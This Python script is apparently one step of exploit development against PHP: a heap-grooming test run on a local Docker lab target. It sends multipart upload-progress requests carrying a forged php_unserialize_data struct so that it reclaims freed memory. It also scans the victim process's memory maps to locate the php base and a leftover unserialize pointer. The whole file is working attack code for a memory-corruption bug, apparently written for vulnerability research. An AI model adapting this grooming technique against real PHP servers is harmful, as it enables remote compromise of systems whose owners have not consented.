#!/usr/bin/env python3
"""smb_groom_test.py — groom landing test (attempt-5).

Consumer multipart with an 8192B VALUE field carrying a BENIGN fake
php_unserialize_data (fresh-like init: last=&entries, first_dtor/
last_dtor=NULL, max_depth=4096, entries.used_slots=0). If the value
re-takes the freed d run, the consumer's nested decode walks OUR struct:
- benign => decode completes => 200 + writeback (CONTROL PROVEN)
- not landed => tmp_var walks clobbered garbage => 502 SEGV (baseline)
"""
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s

BND = b"G"


def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename:
        d += b'; filename="' + filename + b'"'
    out = b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"
    if filename:
        return b"--" + BND + b"\r\n" + d + b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n"
    return out


def fake_d(groom_addr):
    """Benign php_unserialize_data at groom_addr (8192B buffer)."""
    b = bytearray(8192)
    # last = &d->entries (embedded @ +0x38)
    struct.pack_into("<Q", b, 0x00, groom_addr + 0x38)
    # first_dtor = last_dtor = NULL (fresh emalloc path in tmp_var)
    struct.pack_into("<Q", b, 0x08, 0)
    struct.pack_into("<Q", b, 0x10, 0)
    # allowed_classes = ref_props = NULL; cur_depth=0; max_depth=4096
    struct.pack_into("<Q", b, 0x30, 4096)
    # entries.used_slots @ +0x38 = 0 (already zero)
    return bytes(b)


def groom_consumer(gsid, groom_addr, filedata=b"z" * 8192, progress=b"poc",
                   groom_value=None):
    gv = groom_value if groom_value is not None else fake_d(groom_addr)
    body = (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", progress) +
            part(b"g", gv) +
            part(b"f", filedata, filename=b"a.txt") +
            b"--" + BND + b"--\r\n")
    s2 = socket.create_connection(("127.0.0.1", 8151), timeout=25)
    s2.sendall((f"POST /ping.php HTTP/1.1\r\nHost: x\r\n"
                f"Content-Type: multipart/form-data; boundary=G\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                ).encode() + body)
    buf = b""
    s2.settimeout(25)
    while True:
        try:
            d = s2.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
    s2.close()
    first = buf.split(b"\r\n", 1)[0].decode(errors="replace") if buf else "(reset)"
    return first, buf


def main():
    print("=== groom landing test ===")
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    # producer
    sid = f"gl{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print(f"producer: {st}")
    # read the remnant d address (assisted bootstrap)
    maps = s.get_maps("vuln")
    base = int([l for l in maps if "/usr/local/bin/php" in l and "r-xp" in l][0].split("-")[0].split()[0], 16)
    # bss-anon segment = the anon rw-p right after php's file rw-p
    segs = []
    for i, l in enumerate(maps):
        if "/usr/local/bin/php" in l and "rw-p" in l:
            a, b = [int(x, 16) for x in l.split()[0].split("-")]
            if i + 1 < len(maps):
                a2, b2 = [int(x, 16) for x in maps[i + 1].split()[0].split("-")]
                if a2 == b and "rw-p" in maps[i + 1] and "php" not in maps[i + 1]:
                    segs.append((a2, b2))
    bss = segs[0]
    print(f"php base: 0x{base:x}; bss-anon: 0x{bss[0]:x}-0x{bss[1]:x}")
    seg = s.read_mem("vuln", bss[0], bss[1] - bss[0])
    # BG(unserialize) = the qword pair {0->heapptr, level} — find by pattern:
    # data ptr page-aligned heap value, next qword = 1
    hrs = s.heap_ranges(maps)
    d_addr = None
    for off in range(0, len(seg) - 15, 8):
        v = int.from_bytes(seg[off:off + 8], "little")
        lvl = int.from_bytes(seg[off + 8:off + 16], "little")
        if lvl == 1 and (v & 0xFFF) == 0 and v > 0x10000 and s.looks_heap(v, hrs):
            print(f"remnant candidate @bss+0x{off:x}: BG(unserialize).data=0x{v:x} level=1")
            d_addr = v
            break
    if d_addr is None:
        print("!! remnant not found in bss — did the producer fire?")
        return 1
    # consumer with groom; the groom buffer address is unknown until it
    # lands — the fake_d needs a self-referential last pointer. Iterate:
    # the groom VALUE re-takes d's run => buffer address == d_addr.
    gsid = f"glc{int(time.time())}"
    import base64 as b64
    tok = b"k|i:42;"
    q.docker_exec(q.CT["vuln"],
                  f"F=/tmp/sess_{gsid}; rm -f $F; echo {b64.b64encode(tok).decode()} | base64 -d > $F; "
                  f"chown nobody:nobody $F; chmod 600 $F")
    print(f"consumer (groom self-ref = d_addr 0x{d_addr:x}):")
    first, buf = groom_consumer(gsid, d_addr)
    print(f"  resp: {first}")
    rc, out = q.docker_exec(q.CT["vuln"], f"cat /tmp/sess_{gsid} 2>/dev/null")
    print(f"  sess after: {out[:200]!r}")
    pid = q.snap("vuln")
    print(f"  pid: {pid[0]}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
